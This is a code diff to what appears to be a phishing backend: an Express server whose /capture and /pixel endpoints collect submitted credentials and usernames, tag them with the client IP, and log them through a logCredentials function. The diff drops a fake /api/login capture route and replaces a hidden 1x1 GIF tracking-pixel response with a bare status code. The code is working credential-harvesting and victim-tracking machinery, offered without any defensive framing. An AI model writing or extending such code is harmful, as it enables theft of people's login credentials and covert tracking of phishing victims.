@@ -170,21 +170,15 @@ app.get('/', (req, res) => {
     }
 });
 
-// --- CAPTURE ENDPOINTS ---
+// Capture endpoint (already exists)
 app.post('/capture', (req, res) => {
-    const data = req.body;
-    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    logCredentials(data);
-    res.status(200).json({ status: 'ok', message: 'Captured' });
-});
-
-app.post('/api/login', (req, res) => {
     const data = req.body;
     data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     logCredentials(data);
     res.status(200).json({ status: 'ok' });
 });
 
+// Pixel endpoint (already exists)
 app.get('/pixel', (req, res) => {
     const data = {
         username: req.query.u || 'unknown',
@@ -193,11 +187,7 @@ app.get('/pixel', (req, res) => {
         timestamp: new Date().toISOString()
     };
     logCredentials(data);
-    res.writeHead(200, {
-        'Content-Type': 'image/gif',
-        'Cache-Control': 'no-cache'
-    });
-    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
+    res.sendStatus(200);
 });
 
 // --- VIEW LOGS ---
